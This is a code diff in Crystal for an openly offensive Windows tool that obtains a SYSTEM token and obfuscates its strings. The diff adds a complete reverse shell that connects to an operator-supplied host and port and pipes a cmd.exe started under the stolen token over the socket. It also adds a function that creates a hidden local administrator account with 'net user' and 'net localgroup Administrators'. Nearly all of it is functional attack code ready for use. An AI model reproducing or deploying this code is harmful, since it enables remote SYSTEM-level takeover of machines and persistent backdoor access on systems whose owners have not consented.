@@ -751,6 +751,14 @@ lib WinExtra
     lpStartAddress : Pointer(Void) -> UInt32, lpParameter : Void*,
     dwCreationFlags : UInt32, lpThreadId : UInt32*) : Void*
   fun VirtualProtect(lpAddress : Void*, dwSize : UInt64, flNewProtect : UInt32, lpflOldProtect : UInt32*) : Int32
+  fun PeekNamedPipe(hNamedPipe : Void*, lpBuffer : Void*, nBufferSize : UInt32,
+    lpBytesRead : UInt32*, lpTotalBytesAvail : UInt32*, lpBytesLeftThisMessage : UInt32*) : Int32
+end
+
+@[Link("ws2_32")]
+lib LibC
+  fun inet_addr(cp : UInt8*) : UInt32
+  fun select(nfds : Int32, readfds : Void*, writefds : Void*, exceptfds : Void*, timeout : Void*) : Int32
 end
 
 lib LibGC
@@ -814,6 +822,12 @@ STARTF_USESTDHANDLES      = 0x00000100_u32
 CREATE_NO_WINDOW          = 0x08000000_u32
 CREATE_UNICODE_ENVIRONMENT = 0x00000400_u32
 HANDLE_FLAG_INHERIT       = 0x00000001_u32
+
+AF_INET        = 2_i32
+SOCK_STREAM    = 1_i32
+IPPROTO_TCP    = 6_i32
+FIONBIO        = 0x8004667E_u32
+INVALID_SOCKET = ~0_u64
 
 SECURITY_IMPERSONATION  = 2_i32
 TOKEN_PRIMARY           = 1_i32
@@ -968,6 +982,33 @@ struct ProcessInformationCR
   property dw_thread_id : UInt32 = 0_u32
 
   def initialize
+  end
+end
+
+struct SockAddrIn
+  property sin_family : UInt16 = 0_u16
+  property sin_port : UInt16 = 0_u16
+  property sin_addr : UInt32 = 0_u32
+  property sin_zero : StaticArray(UInt8, 8) = StaticArray(UInt8, 8).new(0_u8)
+
+  def initialize
+  end
+end
+
+struct FdSetCR
+  property fd_count : UInt32 = 0_u32
+  property _pad : UInt32 = 0_u32
+  property fd_array : StaticArray(UInt64, 64) = StaticArray(UInt64, 64).new(0_u64)
+
+  def initialize
+  end
+end
+
+struct TvCR
+  property tv_sec : Int32 = 0_i32
+  property tv_usec : Int32 = 0_i32
+
+  def initialize(@tv_sec = 0_i32, @tv_usec = 0_i32)
   end
 end
 
@@ -1490,6 +1531,182 @@ def create_process_read_output(token_handle : Pointer(Void), command_line : Stri
 end
 
 
+# ─────────────── Reverse Shell ─────────────────────────
+def reverse_shell(token_handle : Pointer(Void), host : String, port : UInt16, shell : String)
+  wsa_data = uninitialized LibC::WSAData
+  if LibC.WSAStartup(0x0202_u16, pointerof(wsa_data)) != 0
+    dbg1 obf("[!] WSA err")
+    return
+  end
+
+  sock = LibC.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+  if sock == INVALID_SOCKET
+    dbg1 obf("[!] sock err")
+    LibC.WSACleanup
+    return
+  end
+
+  addr = SockAddrIn.new
+  addr.sin_family = AF_INET.to_u16
+  addr.sin_port = LibC.htons(port)
+  addr.sin_addr = LibC.inet_addr(host.to_unsafe)
+
+  if LibC.connect(sock, pointerof(addr).as(Pointer(LibC::Sockaddr)), sizeof(SockAddrIn)) != 0
+    dbg1 obf("[!] conn err")
+    LibC.closesocket(sock)
+    LibC.WSACleanup
+    return
+  end
+
+  dbg1 obf("[*] connected")
+
+  nonblocking = 1_u32
+  LibC.ioctlsocket(sock, FIONBIO, pointerof(nonblocking))
+
+  sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, Pointer(Void).null, 1)
+
+  stdin_read = Pointer(Void).null
+  stdin_write = Pointer(Void).null
+  if WinExtra.CreatePipe(pointerof(stdin_read), pointerof(stdin_write),
+      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
+    LibC.closesocket(sock)
+    LibC.WSACleanup
+    return
+  end
+
+  stdout_read = Pointer(Void).null
+  stdout_write = Pointer(Void).null
+  if WinExtra.CreatePipe(pointerof(stdout_read), pointerof(stdout_write),
+      pointerof(sa).as(Pointer(Void)), 4096_u32) == 0
+    SysState.nt_close(stdin_read)
+    SysState.nt_close(stdin_write)
+    LibC.closesocket(sock)
+    LibC.WSACleanup
+    return
+  end
+
+  WinExtra.SetHandleInformation(stdin_read, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
+  WinExtra.SetHandleInformation(stdin_write, HANDLE_FLAG_INHERIT, 0_u32)
+  WinExtra.SetHandleInformation(stdout_write, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)
+  WinExtra.SetHandleInformation(stdout_read, HANDLE_FLAG_INHERIT, 0_u32)
+
+  primary_token = Pointer(Void).null
+  dup_oa = ObjectAttributesSC.new
+  has_primary = SysState.nt_duplicate_token(
+    token_handle, TOKEN_ELEVATION,
+    pointerof(dup_oa).as(Pointer(Void)),
+    0_u32, TOKEN_PRIMARY.to_u32,
+    pointerof(primary_token)) >= 0
+  primary_token = token_handle unless has_primary
+
+  si = StartupInfoW.new
+  si.h_std_input = stdin_read
+  si.h_std_output = stdout_write
+  si.h_std_error = stdout_write
+  si.dw_flags = STARTF_USESTDHANDLES
+
+  pi = ProcessInformationCR.new
+  cmdline_w = shell.to_utf16
+
+  created = false
+  if SysState.create_process_as_user_w(
+      primary_token, Pointer(UInt16).null, cmdline_w.to_unsafe,
+      Pointer(Void).null, Pointer(Void).null, 1,
+      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
+      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
+    created = true
+    dbg obf("[*] shell via CPAU")
+  elsif SysState.create_process_with_token_w(
+      primary_token, 0_u32, Pointer(UInt16).null, cmdline_w.to_unsafe,
+      CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW, Pointer(Void).null, Pointer(UInt16).null,
+      pointerof(si).as(Pointer(Void)), pointerof(pi).as(Pointer(Void))) != 0
+    created = true
+    dbg obf("[*] shell via CPWTW")
+  end
+
+  SysState.nt_close(primary_token) if has_primary
+
+  unless created
+    dbg1 obf("[!] shell err:") + LibC.GetLastError.to_s
+    SysState.nt_close(stdin_read)
+    SysState.nt_close(stdin_write)
+    SysState.nt_close(stdout_read)
+    SysState.nt_close(stdout_write)
+    LibC.closesocket(sock)
+    LibC.WSACleanup
+    return
+  end
+
+  dbg1 obf("[*] shell pid ") + pi.dw_process_id.to_s
+
+  SysState.nt_close(stdin_read)
+  SysState.nt_close(stdout_write)
+
+  buf = Bytes.new(4096)
+
+  loop do
+    timeout_zero = 0_i64
+    status = SysState.nt_wait_for_single_object(pi.h_process, 0, pointerof(timeout_zero).as(Pointer(Void)))
+    break if status == 0
+
+    fd = FdSetCR.new
+    fd.fd_count = 1_u32
+    fd.fd_array[0] = sock
+    tv = TvCR.new(0_i32, 10000_i32)
+
+    sel = LibC.select(0, pointerof(fd).as(Pointer(Void)),
+      Pointer(Void).null, Pointer(Void).null, pointerof(tv).as(Pointer(Void)))
+
+    break if sel == -1
+
+    if sel > 0
+      bytes_recv = LibC.recv(sock, buf.to_unsafe, 4096_i32, 0)
+      if bytes_recv > 0
+        bytes_written = 0_u32
+        LibC.WriteFile(stdin_write, buf.to_unsafe.as(Pointer(Void)),
+          bytes_recv.to_u32, pointerof(bytes_written), Pointer(LibC::OVERLAPPED).null)
+      else
+        break
+      end
+    end
+
+    bytes_avail = 0_u32
+    WinExtra.PeekNamedPipe(stdout_read, Pointer(Void).null, 0_u32,
+      Pointer(UInt32).null, pointerof(bytes_avail), Pointer(UInt32).null)
+
+    if bytes_avail > 0
+      bytes_read = 0_u32
+      LibC.ReadFile(stdout_read, buf.to_unsafe.as(Pointer(Void)),
+        4096_u32, pointerof(bytes_read), Pointer(LibC::OVERLAPPED).null)
+      if bytes_read > 0
+        total_sent = 0_i32
+        while total_sent < bytes_read.to_i32
+          sent = LibC.send(sock, buf.to_unsafe + total_sent, bytes_read.to_i32 - total_sent, 0)
+          break if sent == -1
+          total_sent += sent
+        end
+      end
+    end
+  end
+
+  SysState.nt_close(stdin_write)
+  SysState.nt_close(stdout_read)
+  SysState.nt_close(pi.h_process)
+  SysState.nt_close(pi.h_thread)
+  LibC.closesocket(sock)
+  LibC.WSACleanup
+end
+
+
+# ─────────────── Add Local Admin ───────────────────────
+def add_local_admin(token_handle : Pointer(Void), username : String, password : String)
+  cmd1 = obf("net user ") + username + " " + password + obf(" /add")
+  cmd2 = obf("net localgroup Administrators ") + username + obf(" /add")
+  create_process_read_output(token_handle, cmd1)
+  create_process_read_output(token_handle, cmd2)
+end
+
+
 # ─────────────── Hook State ─────────────────────────────
 module HookState
   @@client_pipe = ""
@@ -1897,6 +2114,10 @@ end
 def main
   command = ""
   pipe_name = obf("Crystal")
+  lhost = ""
+  lport = 0_u16
+  username = ""
+  password = ""
 
   dd_flag = obf("-dd")
   if idx = ARGV.index(dd_flag)
@@ -1904,16 +2125,32 @@ def main
     ARGV.delete_at(idx)
   end
 
+  pw_flag = obf("-pw")
+  if idx = ARGV.index(pw_flag)
+    if idx + 1 < ARGV.size
+      password = ARGV[idx + 1]
+      ARGV.delete_at(idx + 1)
+    end
+    ARGV.delete_at(idx)
+  end
+
   OptionParser.parse do |parser|
     parser.banner = obf("Usage: main.exe [options]")
-    parser.on(obf("-c CMD"), obf("--cmd=CMD"), obf("Command")) { |c| command = c }
+    parser.on(obf("-c CMD"), obf("--cmd=CMD"), obf("Command / shell")) { |c| command = c }
     parser.on(obf("-p NAME"), obf("--pipe=NAME"), obf("Pipe name")) { |p| pipe_name = p }
+    parser.on(obf("-H HOST"), obf("--lhost=HOST"), obf("Reverse shell host")) { |h| lhost = h }
+    parser.on(obf("-P PORT"), obf("--lport=PORT"), obf("Reverse shell port")) { |p| lport = p.to_u16 }
+    parser.on(obf("-u USER"), obf("--user=USER"), obf("Local admin user")) { |u| username = u }
     parser.on(obf("-d"), obf("Debug")) { Config.debug_level = 1 }
     parser.on(obf("-h"), obf("--help"), obf("Help")) { puts parser; exit }
   end
 
-  if command.empty?
-    STDERR.puts obf("[!] -c required")
+  has_revshell = !lhost.empty? && lport > 0
+  has_adduser = !username.empty? && !password.empty?
+  has_command = !command.empty?
+
+  unless has_revshell || has_adduser || has_command
+    STDERR.puts obf("[!] -c, -H/-P, or -u/-pw required")
     exit(1)
   end
 
@@ -1949,7 +2186,14 @@ def main
     system_token = ctx.get_token
     if system_token
       dbg1 obf("[*] OK")
-      create_process_read_output(system_token, command)
+      if has_revshell
+        shell = command.empty? ? obf("cmd.exe") : command
+        reverse_shell(system_token, lhost, lport, shell)
+      elsif has_adduser
+        add_local_admin(system_token, username, password)
+      else
+        create_process_read_output(system_token, command)
+      end
     else
       dbg1 obf("[!] failed")
     end
